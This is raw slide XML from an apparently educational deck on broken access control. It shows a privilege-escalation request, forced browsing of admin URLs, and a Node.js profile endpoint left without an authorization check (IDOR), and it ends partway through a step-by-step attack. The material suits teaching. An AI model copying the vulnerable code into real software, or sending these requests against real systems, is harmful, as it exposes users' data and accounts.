                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  -H "Content-Type: application/json" \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  -d '{"user_id": 123, "role": "admin"}'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="5366623"/>
            <a:ext cx="1792129" cy="223957"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="5713809"/>
            <a:ext cx="9422011" cy="904875"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6338"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2597348" y="5713809"/>
            <a:ext cx="9435584" cy="904875"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2264"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2733794" y="5816203"/>
            <a:ext cx="9162693" cy="700088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "status": "success",</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "message": "User 123 promoted to admin"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604135" y="6711077"/>
            <a:ext cx="9422011" cy="433388"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13233"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2740581" y="6891695"/>
            <a:ext cx="170617" cy="136446"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3047643" y="6827282"/>
            <a:ext cx="8842058" cy="175022"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Regular user can promote themselves to admin!</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02449" y="951548"/>
            <a:ext cx="5468779"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.5 Forced Browsing / Direct URL Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1346240"/>
            <a:ext cx="1746885"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What is Forced Browsing?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1617226"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Accessing resources by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>directly navigating to URLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> that should be restricted, bypassing the normal application flow.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1838325"/>
            <a:ext cx="2302907"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Vulnerable Application Structure:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2109311"/>
            <a:ext cx="7825502" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="2109311"/>
            <a:ext cx="7836694" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1021"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="2194322"/>
            <a:ext cx="7609999" cy="1496973"/>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Application Structure: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/public/</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 index.html</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 login.html</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/user/</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 dashboard.html</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 profile.html</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/admin/</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 panel.html      ← Should be restricted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 users.html      ← Should be restricted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 settings.html   ← Should be restricted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3861316"/>
            <a:ext cx="3172420"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Vulnerable Code (Client-Side Only Protection):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4132302"/>
            <a:ext cx="7825502" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="4132302"/>
            <a:ext cx="7836694" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4217313"/>
            <a:ext cx="7609999" cy="1224796"/>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&lt;!-- HTML - VULNERABLE --&gt;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&lt;nav&gt;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&lt;a href="/user/dashboard.html"&gt;Dashboard&lt;/a&gt;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&lt;a href="/user/profile.html"&gt;Profile&lt;/a&gt;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&lt;!-- Admin menu hidden with CSS/JavaScript --&gt;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&lt;div id="adminMenu" style="display:none"&gt;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&lt;a href="/admin/panel.html"&gt;Admin Panel&lt;/a&gt;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&lt;/div&gt;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&lt;/nav&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5612130"/>
            <a:ext cx="1488519"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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5883116"/>
            <a:ext cx="7825502" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5883116"/>
            <a:ext cx="7836694" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="5968127"/>
            <a:ext cx="7609999" cy="1224796"/>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Regular user logs in</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Admin menu is hidden in UI</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But attacker can directly access admin pages:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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https://example.com/admin/panel.html</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https://example.com/admin/users.html</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https://example.com/admin/settings.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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All pages load successfully! ← VULNERABILITY</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02449" y="321588"/>
            <a:ext cx="4068008"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6. Real-Time Attack Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="716280"/>
            <a:ext cx="4147661" cy="297656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6.1 Social Media Profile Access (IDOR)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1036558"/>
            <a:ext cx="2457926"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Scenario: Facebook-like Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1245156"/>
            <a:ext cx="1488519"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Vulnerable Endpoint:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1516142"/>
            <a:ext cx="7825502" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3784"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1516142"/>
            <a:ext cx="7836694" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1601153"/>
            <a:ext cx="7609999" cy="1088708"/>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Node.js/Express - VULNERABLE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app.get('/api/profile/:userId', authenticateUser, (req, res) =&gt;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const userId = req.params.userId;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 NO AUTHORIZATION CHECK</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db.query('SELECT * FROM profiles WHERE user_id = ?', [userId])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.then(profile =&gt; res.json(profile))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.catch(err =&gt; res.status(500).send('Error'));</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2859881"/>
            <a:ext cx="1488519"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Step-by-Step Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3130868"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3308271"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3395424"/>
            <a:ext cx="1679138" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker creates account</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3645098"/>
            <a:ext cx="3884414" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4243"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="3645098"/>
            <a:ext cx="3895606" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1515"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="3730109"/>
            <a:ext cx="3668911" cy="952619"/>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POST /api/register</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"username": "attacker",</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"email": "attacker@evil.com",</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"password": "password123"</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Response: {"userId": 5001, "message": "Account created"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="3130868"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
